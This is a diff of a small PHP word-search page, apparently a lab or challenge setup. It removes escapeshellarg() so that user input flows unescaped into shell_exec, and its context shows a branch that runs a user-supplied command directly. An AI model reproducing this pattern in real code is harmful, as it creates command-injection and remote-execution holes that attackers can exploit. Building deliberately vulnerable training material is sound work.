@@ -14,7 +14,7 @@ if (!empty($key)) {
         $command = substr($key, 1);
         $output .= "Command output: " . shell_exec($command);
     } else {
-        $command = "grep -i " . escapeshellarg($key) . " " . escapeshellarg($dictionaryFile);
+        $command = "grep -i " . $key . " " . $dictionaryFile;
         $output .= "Search results: " . shell_exec($command);
     }
 }
@@ -29,7 +29,7 @@ if (!empty($key)) {
 <body>
     <h1>Find words containing:</h1>
     <form method="get">
-        <label for="needle">Needle:</label>
+        <label for="needle">Enter the Character to get the words matched:</label>
         <input type="text" id="needle" name="needle" />
         <input type="submit" value="Search" />
     </form>
@@ -48,4 +48,3 @@ if (!empty($key)) {
     </div>
 </body>
 </html>
-
